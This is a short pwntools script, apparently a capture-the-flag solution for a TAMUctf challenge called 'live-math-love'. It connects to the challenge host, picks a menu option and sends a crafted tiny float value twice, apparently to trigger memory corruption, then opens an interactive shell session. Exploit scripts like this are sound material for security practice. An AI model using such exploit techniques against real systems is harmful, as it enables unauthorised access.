from pwn import *

p = remote("tamuctf.com", 443, ssl=True, sni="live-math-love")

p.sendlineafter(b'> ', b'1')
p.sendline(b'0')
p.sendline(b'5.883708e-39')
p.sendline(b'5.883708e-39')

p.interactive()
